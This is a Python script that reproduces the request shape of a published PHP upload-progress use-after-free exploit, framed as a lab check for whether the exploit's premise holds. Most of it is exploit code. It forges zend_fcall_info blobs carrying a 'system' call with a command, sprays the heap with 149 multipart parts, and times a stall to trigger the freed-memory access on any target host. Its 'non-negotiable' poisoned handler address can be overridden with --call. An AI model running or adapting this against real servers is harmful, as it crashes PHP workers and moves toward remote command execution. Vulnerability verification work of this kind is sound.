#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Reproduction of the SHAPE of the published php2shell request
(CVE-2026-109618 / -109619) — premise verification, without weaponising it.

What it does: sends a multipart body with the same structure as the public
PoCs (2 file fields, 149 t[] parts with 288-byte blobs that land in 320-byte
bins, ~1.35 s pause between phases) to check whether the stale store actually
lands in freed memory.

SECURITY RULE (non-negotiable): the forged handler is ALWAYS planted at the
poison address 0x4141414141414141 (or whatever is passed with --call). If the
forged structure were ever interpreted, the process would die instantly
instead of executing anything. This script does NOT compute real addresses,
does NOT defeat ASLR and does NOT execute commands: it only checks whether
the exploit premise (freed memory + attacker-controlled reclaim) holds.

Observable difference between a released PHP and an "ablated" one (without
the Z_TRY_ADDREF(progress->data) line):
  * released PHP -> HTTP 200, no ASAN report, the forged blob is never
    interpreted.
  * ablated PHP -> ASAN: heap-use-after-free on the first stale access.
"""

import argparse
import socket
import struct
import sys
import time

BOUNDARY = "B7kQpoc618"
FILL = 5120
N149 = 149
BLOB = 288
FCI = 64
IS_STRING_EX = 0x106
IS_OBJECT_EX = 0x308
ZEND_INTERNAL = 1
POISON = 0x4141414141414141


def forge(call: int, cmd: bytes) -> bytes:
    """288-byte blob shaped like a zend_fcall_info (zeros on the call)."""
    rec = bytearray(BLOB)
    struct.pack_into("<Q", rec, 0, FCI)
    struct.pack_into("<Q", rec, 8, call)          # call pointer (poisoned)
    struct.pack_into("<I", rec, 16, IS_STRING_EX)
    struct.pack_into("<I", rec, 48, 1)            # param_count
    struct.pack_into("<B", rec, 64, ZEND_INTERNAL)
    struct.pack_into("<Q", rec, 64 + 88, call)    # handler -> (poisoned)
    struct.pack_into("<I", rec, 160, IS_OBJECT_EX)
    sysb = b"system\x00" + cmd + b"\x00"
    rec[200 : 200 + len(sysb)] = sysb[:80]
    return bytes(rec)


def part(name: str, body: bytes, filename: str | None = None) -> bytes:
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    return b"--" + BOUNDARY.encode() + b"\r\n" + disp.encode() + b"\r\n\r\n" + body


def build(sid: str, cmd: bytes, call: int):
    blob = forge(call, cmd)
    pre = (
        part("PHPSESSID", sid.encode()) + b"\r\n"
        + part("PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n"
        + part("f", b"", filename="a") + b"\r\n"
    )
    phase1 = pre + b"A" * (FILL + 64)

    tail = b"B" * (FILL + 64) + b"\r\n"           # end of file f
    for _ in range(N149):                          # reclaim: 149 x t[]
        tail += part("t[]", blob) + b"\r\n"
    tail += part("g", b"C" * 64, filename="b") + b"\r\n"   # second file
    tail += b"--" + BOUNDARY.encode() + b"--\r\n"
    return phase1, tail


def send(host, port, path, sid, phase1, tail, stall, timeout):
    head = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"User-Agent: php2shell-shape-check\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {len(phase1) + len(tail)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    s = socket.create_connection((host, port), timeout=40)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    try:
        s.sendall(head + phase1)
        time.sleep(stall)          # min_freq window -> second update()
        s.sendall(tail)
        s.settimeout(timeout)
        chunks = []
        while True:
            try:
                d = s.recv(65536)
            except socket.timeout:
                break
            if not d:
                break
            chunks.append(d)
        return b"".join(chunks)
    finally:
        s.close()


def main():
    ap = argparse.ArgumentParser(description="php2shell published request shape (poisoned handler)")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8080)
    ap.add_argument("--path", default="/")
    ap.add_argument("--sid", default="a1b2c3d4e5f6a7b8c9d0e1f2a3")
    ap.add_argument("--stall", type=float, default=1.35)
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument("--call", default=hex(POISON),
                    help="address of the planted handler (poisoned by default)")
    args = ap.parse_args()

    call = int(args.call, 0)
    phase1, tail = build(args.sid, b"id", call)
    print(f"[*] published shape: phase1={len(phase1)}B tail={len(tail)}B "
          f"total={len(phase1) + len(tail)}B t[]={N149}x{BLOB}B handler={hex(call)} (poisoned)")

    try:
        resp = send(args.host, args.port, args.path, args.sid, phase1, tail,
                    args.stall, args.timeout)
    except (ConnectionResetError, BrokenPipeError, OSError) as e:
        print(f"[!] connection reset ({e.__class__.__name__}): the worker died "
              f"-> the UAF materialised (check ASAN in the logs)")
        return 1

    head = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "NO-RESPONSE"
    print(f"[*] response: {head} ({len(resp)}B)")
    if not resp:
        print("[!] no response: possible worker crash")
        return 1
    print("[*] Check ASAN: docker logs php-uaf-lab 2>&1 | grep -B5 -A45 AddressSanitizer")
    return 0


if __name__ == "__main__":
    sys.exit(main())
